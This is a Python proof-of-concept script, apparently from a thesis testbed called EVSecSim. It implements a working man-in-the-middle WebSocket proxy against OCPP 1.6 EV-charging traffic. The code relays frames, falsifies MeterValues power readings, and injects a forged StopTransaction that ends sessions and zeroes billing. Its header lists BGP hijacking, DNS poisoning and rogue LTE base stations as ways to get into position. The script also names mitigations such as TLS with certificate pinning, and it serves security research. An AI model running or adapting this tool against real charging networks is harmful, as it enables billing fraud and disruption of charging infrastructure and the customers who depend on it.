"""
===========================================================================
EVSecSim PoC — Attack #2b: EXTERNAL MITM WebSocket Proxy
===========================================================================

THREAT MODEL — EXTERNAL ATTACKER (public-net)
----------------------------------------------
This variant models an attacker who is NOT on the operator's internal LAN.
Instead, the attacker is positioned on the public-facing WAN between the
EVSE and a cloud-hosted CSMS.

In Singapore's SP Group / CPO architecture, EVSEs frequently connect to
cloud CSMS platforms over 4G/LTE or public internet. This exposes the
OCPP channel to WAN-level interception that does not require any physical
presence on the charging site.

INITIAL ACCESS — EXTERNAL INTERPOSITION VECTORS
------------------------------------------------
  BGP Hijacking:
    Attacker announces a more-specific prefix covering the CSMS's IP
    block. Traffic from EVSEs routed through the attacker's AS is
    transparently proxied. No access to the charging site required.
    Practical precedent: BGP hijacks of cloud provider ranges have
    been observed in the wild (e.g. Amazon Route 53, 2018).

  DNS Poisoning / Spoofing:
    Attacker poisons the DNS resolver used by the EVSE's 4G SIM or
    gateway. The EVSE resolves the CSMS hostname to the attacker's
    IP. No LAN access required.

  Rogue 4G Base Station (IMSI catcher variant):
    Attacker operates a rogue LTE base station near the charging site.
    EVSE modems attach to it; all TCP traffic is transparently proxied.

  Compromised Cloud Reverse Proxy:
    Many CPOs terminate EVSE WebSockets at a cloud load balancer before
    forwarding to internal CSMS. Compromising or impersonating this
    proxy achieves equivalent MITM positioning.

NETWORK POSITION IN TESTBED
-----------------------------
  Internal MITM (attack_mitm_session_patched.py):
    operator-net only — models ARP poisoning on charging site LAN

  THIS SCRIPT (external):
    public-net only — models WAN/cloud interception
    Attacker IP : 172.20.0.30 (public-net)
    EVSE victim : 172.20.0.50 (public-net — simulates WAN-connected EVSE)
    Upstream    : ws://csms:9000 via public-net (172.20.0.10)

  External attacker has NO visibility into operator-net (172.19.0.0/24).
  The only shared surface is the CSMS's public-net interface.

ATTACK PHASES (identical capability to internal variant)
---------------------------------------------------------
  Phase 1 — Transparent forwarding   : relay + log all OCPP frames
  Phase 2 — MeterValues tampering    : falsify power readings in transit
  Phase 3 — StopTransaction injection: forge session termination to CSMS

ROOT CAUSE
----------
  OCPP 1.6 uses ws:// (plaintext). No TLS, no certificate pinning, no
  message signing. The EVSE cannot distinguish the real CSMS from a
  proxy. Any network path between EVSE and CSMS is a viable attack
  surface — not just the local LAN.

MITIGATION
----------
  WSS (TLS 1.2+) with certificate pinning eliminates BGP/DNS hijacks.
  Mutual TLS (client + server certs) prevents rogue proxy insertion.
  OCPP 2.0.1 signed messages add per-message integrity even if TLS is
  stripped.

REFERENCE
---------
  Johnson et al. (2023). Disrupting EV Charging Sessions...
  Idaho National Laboratory INL/CON-23-72329, PoC #2.
===========================================================================
"""

import asyncio
import json
import os
import signal
import sys
import time
import argparse
import websockets
from datetime import datetime, timezone

# ===========================================================================
# CONFIG
# ===========================================================================

PROXY_PORT      = 9002                   # different port from internal variant
CSMS_URL        = "ws://127.0.0.1:9000"
TAMPER_DELAY_S  = 10
INJECT_DELAY_S  = 20
TAMPER_VALUE_KW = 999.0

# ===========================================================================
# COLOUR HELPERS
# ===========================================================================

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BLUE   = "\033[94m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def ts():
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]

def log_proxy(msg):  print(f"{CYAN}[PRX {ts()}]{RESET} {msg}")
def log_evse(msg):   print(f"{GREEN}[E→C {ts()}]{RESET} {msg}")
def log_csms(msg):   print(f"{BLUE}[C→E {ts()}]{RESET} {msg}")
def log_attack(msg): print(f"{RED}[ATK {ts()}]{RESET} {msg}")
def log_tamper(msg): print(f"{YELLOW}[TAM {ts()}]{RESET} {msg}")

# ===========================================================================
# OCPP MESSAGE PARSING
# ===========================================================================

CALL       = 2
CALLRESULT = 3
CALLERROR  = 4

def parse_ocpp(raw: str):
    try:
        msg = json.loads(raw)
        if msg[0] == CALL:
            return CALL, msg[1], msg[2], msg[3]
        elif msg[0] == CALLRESULT:
            return CALLRESULT, msg[1], None, msg[2]
        elif msg[0] == CALLERROR:
            return CALLERROR, msg[1], msg[2], msg[3]
    except Exception:
        pass
    return None, None, None, None

def forge_stop_transaction(transaction_id: int = 1) -> str:
    payload = {
        "transactionId": transaction_id,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "meterStop": 0,
        "reason": "Remote",
    }
    uid = f"ext-stop-{int(time.time())}"
    return json.dumps([CALL, uid, "StopTransaction", payload]), uid

def tamper_meter_values(raw: str) -> str:
    try:
        msg = json.loads(raw)
        if msg[0] != CALL or msg[2] != "MeterValues":
            return raw, False
        original_val = None
        try:
            original_val = msg[3]["meterValue"][0]["sampledValue"][0]["value"]
            msg[3]["meterValue"][0]["sampledValue"][0]["value"] = str(TAMPER_VALUE_KW)
        except (KeyError, IndexError):
            try:
                original_val = msg[3]["meter_value"][0]["sampled_value"][0]["value"]
                msg[3]["meter_value"][0]["sampled_value"][0]["value"] = str(TAMPER_VALUE_KW)
            except (KeyError, IndexError):
                return raw, False
        return json.dumps(msg), original_val
    except Exception:
        return raw, False

# ===========================================================================
# SESSION STATE
# ===========================================================================

class SessionState:
    def __init__(self):
        self.connected_at  = None
        self.cp_id         = None
        self.tamper_active = False
        self.injected      = False
        self.msg_count_ec  = 0
        self.msg_count_ce  = 0
        self.tamper_count  = 0
        self.actions_seen  = []

    def elapsed(self) -> float:
        return 0.0 if self.connected_at is None else time.perf_counter() - self.connected_at

# ===========================================================================
# CORE PROXY LOGIC
# ===========================================================================

async def proxy_session(evse_ws, state: SessionState):
    log_proxy("EVSE connected — opening upstream connection to CSMS via public-net")

    try:
        async with websockets.connect(
            CSMS_URL, ping_interval=None, ping_timeout=None,
        ) as csms_ws:

            log_proxy(f"Upstream CSMS connection established: {CSMS_URL}")

            cp_id_raw = await evse_ws.recv()
            state.cp_id = cp_id_raw
            state.connected_at = time.perf_counter()

            log_proxy(f"CP identity captured: '{cp_id_raw}' — relaying to CSMS")
            await csms_ws.send(cp_id_raw)

            log_attack("=" * 56)
            log_attack(f"EXTERNAL MITM SESSION ACTIVE for CP: '{cp_id_raw}'")
            log_attack(f"Attack surface  : public-net (WAN / cloud path)")
            log_attack(f"Tampering begins: T+{TAMPER_DELAY_S}s")
            log_attack(f"Injection at    : T+{INJECT_DELAY_S}s")
            log_attack("=" * 56)
            print()

            async def evse_to_csms():
                async for raw in evse_ws:
                    state.msg_count_ec += 1
                    mtype, uid, action, payload = parse_ocpp(raw)
                    elapsed = state.elapsed()
                    if action:
                        state.actions_seen.append(action)

                    if elapsed < TAMPER_DELAY_S:
                        if action:
                            log_evse(f"[{action}] uid={uid[:8]} → forwarding")
                        else:
                            log_evse(f"[Response uid={uid[:8] if uid else '?'}] → forwarding")
                        await csms_ws.send(raw)

                    elif elapsed < INJECT_DELAY_S:
                        if not state.tamper_active:
                            state.tamper_active = True
                            print()
                            log_tamper("=" * 56)
                            log_tamper("PHASE 2 — MeterValues TAMPERING (external)")
                            log_tamper(f"  Intercepted on public-net / WAN path")
                            log_tamper(f"  CSMS receives {TAMPER_VALUE_KW} kW instead of real value")
                            log_tamper(f"  Injection in {INJECT_DELAY_S - TAMPER_DELAY_S}s")
                            log_tamper("=" * 56)
                            print()

                        if action == "MeterValues":
                            modified, original = tamper_meter_values(raw)
                            if original is not False:
                                state.tamper_count += 1
                                log_tamper(
                                    f"TAMPERED #{state.tamper_count}: "
                                    f"real={original} kW → csms sees={TAMPER_VALUE_KW} kW"
                                )
                                await csms_ws.send(modified)
                            else:
                                await csms_ws.send(raw)
                        else:
                            if action:
                                log_evse(f"[{action}] → forwarding (tamper phase)")
                            await csms_ws.send(raw)

                    else:
                        if action:
                            log_evse(f"[{action}] → forwarding (post-injection)")
                        await csms_ws.send(raw)

            async def csms_to_evse():
                async for raw in csms_ws:
                    state.msg_count_ce += 1
                    mtype, uid, action, payload = parse_ocpp(raw)
                    if action:
                        log_csms(f"[{action}] uid={uid[:8]} → relaying to EVSE")
                    else:
                        log_csms(f"[Response uid={uid[:8] if uid else '?'}] → relaying to EVSE")
                    await evse_ws.send(raw)

            async def injection_timer():
                await asyncio.sleep(INJECT_DELAY_S)
                if state.injected:
                    return
                state.injected = True
                frame, uid = forge_stop_transaction(transaction_id=1)

                print()
                log_attack("=" * 56)
                log_attack("PHASE 3 — INJECTING FORGED StopTransaction (external)")
                log_attack(f"  Injected from public-net — no LAN access needed")
                log_attack(f"  As if EVSE '{state.cp_id}' sent it → CSMS")
                log_attack(f"  uid       : {uid}")
                log_attack(f"  meterStop : 0 Wh  (billing corrupted)")
                log_attack(f"  reason    : Remote")
                log_attack("EVSE keeps charging. CSMS closes session.")
                log_attack("=" * 56)
                print()

                try:
                    await csms_ws.send(frame)
                    log_attack("StopTransaction delivered to CSMS via public-net")
                except Exception as exc:
                    log_attack(f"Injection failed: {exc}")

            injector_task = asyncio.create_task(injection_timer(), name="injector")

            done, pending = await asyncio.wait(
                [
                    asyncio.create_task(evse_to_csms(), name="evse->csms"),
                    asyncio.create_task(csms_to_evse(), name="csms->evse"),
                ],
                return_when=asyncio.FIRST_COMPLETED,
            )

            injector_task.cancel()
            for task in pending:
                task.cancel()
            for task in list(done) + list(pending) + [injector_task]:
                try:
                    await task
                except (asyncio.CancelledError,
                        websockets.exceptions.ConnectionClosedOK,
                        websockets.exceptions.ConnectionClosedError):
                    pass

    except ConnectionRefusedError:
        log_attack(f"Cannot reach CSMS at {CSMS_URL} — is csms running?")
    except Exception as exc:
        log_proxy(f"Session ended: {type(exc).__name__}: {exc}")
    finally:
        _print_summary(state)


def _print_summary(state: SessionState):
    elapsed = state.elapsed()
    print()
    print(f"{BOLD}{'='*56}{RESET}")
    print(f"{BOLD}  Session summary (EXTERNAL) — CP '{state.cp_id}'{RESET}")
    print(f"{'='*56}")
    print(f"  Duration              : {elapsed:.1f}s")
    print(f"  EVSE→CSMS messages   : {state.msg_count_ec}")
    print(f"  CSMS→EVSE messages   : {state.msg_count_ce}")
    print(f"  MeterValues tampered : {state.tamper_count}")
    print(f"  StopTransaction sent : {'YES (session terminated)' if state.injected else 'NO'}")
    print(f"  Actions observed     : {', '.join(sorted(set(state.actions_seen)))}")
    print(f"{'='*56}")
    print()
    print(f"  {YELLOW}THESIS EVIDENCE CHECKLIST:{RESET}")
    print(f"  [ ] Attacker on public-net only — zero operator-net access")
    print(f"  [ ] pcap: EVSE connects to attacker (public-net) not real CSMS")
    print(f"  [ ] pcap: MeterValues tampered in WAN path (Phase 2)")
    print(f"  [ ] pcap: StopTransaction injected from public-net (Phase 3)")
    print(f"  [ ] CSMS log: session terminated — EVSE never consented")
    print()
    print(f"  {CYAN}MITIGATION:{RESET}")
    print(f"  - WSS + cert pinning: EVSE rejects any proxy on the WAN path")
    print(f"  - OCPP 2.0.1 signed messages: integrity even if TLS is stripped")
    print(f"  - DNS-over-TLS / DNSSEC: prevents DNS-based redirection")
    print()

# ===========================================================================
# PROXY SERVER
# ===========================================================================

async def run_proxy():
    state_store = {}

    async def handler(evse_ws):
        state = SessionState()
        sid = id(evse_ws)
        state_store[sid] = state
        try:
            await proxy_session(evse_ws, state)
        finally:
            state_store.pop(sid, None)

    proxy_bind = os.environ.get("PROXY_BIND", "0.0.0.0")
    server = await websockets.serve(
        handler, proxy_bind, PROXY_PORT,
        ping_interval=None, ping_timeout=None,
    )

    print()
    print(f"{BOLD}{RED}{'='*56}{RESET}")
    print(f"{BOLD}{RED}  EVSecSim PoC — EXTERNAL MITM WebSocket Proxy{RESET}")
    print(f"{BOLD}{RED}{'='*56}{RESET}")
    print(f"  Network position    : public-net (external attacker)")
    print(f"  Proxy listening on  : ws://0.0.0.0:{PROXY_PORT}")
    print(f"  Forwarding to CSMS  : {CSMS_URL}")
    print(f"  Threat model        : BGP hijack / DNS poison / rogue cloud proxy")
    print(f"  Tamper phase starts : T+{TAMPER_DELAY_S}s after EVSE connects")
    print(f"  Injection at        : T+{INJECT_DELAY_S}s after EVSE connects")
    print(f"  Tampered value      : {TAMPER_VALUE_KW} kW")
    print(f"{BOLD}{RED}{'='*56}{RESET}")
    print()

    stop = asyncio.Event()

    def handle_signal(*_):
        print("\nShutting down proxy...")
        stop.set()

    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            asyncio.get_event_loop().add_signal_handler(sig, handle_signal)
        except NotImplementedError:
            signal.signal(sig, handle_signal)

    await stop.wait()
    server.close()
    await server.wait_closed()

# ===========================================================================
# CLI + ENTRY POINT
# ===========================================================================

def parse_args():
    parser = argparse.ArgumentParser(
        description="EVSecSim PoC #2b — External MITM WebSocket proxy (public-net)"
    )
    parser.add_argument("--proxy-port",   type=int,   default=PROXY_PORT)
    parser.add_argument("--csms-url",     default=CSMS_URL)
    parser.add_argument("--tamper-delay", type=float, default=TAMPER_DELAY_S)
    parser.add_argument("--inject-delay", type=float, default=INJECT_DELAY_S)
    parser.add_argument("--tamper-value", type=float, default=TAMPER_VALUE_KW)
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    PROXY_PORT      = args.proxy_port
    CSMS_URL        = args.csms_url
    TAMPER_DELAY_S  = args.tamper_delay
    INJECT_DELAY_S  = args.inject_delay
    TAMPER_VALUE_KW = args.tamper_value

    try:
        asyncio.run(run_proxy())
    except KeyboardInterrupt:
        pass
